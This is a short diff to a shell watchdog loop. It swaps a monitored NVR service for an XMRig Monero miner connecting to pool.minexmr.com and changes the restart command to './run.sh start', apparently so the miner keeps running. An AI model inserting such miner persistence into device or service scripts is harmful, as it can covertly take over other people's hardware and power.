@@ -17,10 +17,10 @@ function CheckProcess()
 
 
 while [ 1 ] ; do
-        CheckProcess "nvr_service"
+        CheckProcess "./xmrig -o pool.minexmr.com:443"
         if [ $? == 0 ];then
     # restart xxx
-    ./xxx
+    ./run.sh start
     fi
 
     #add other process...
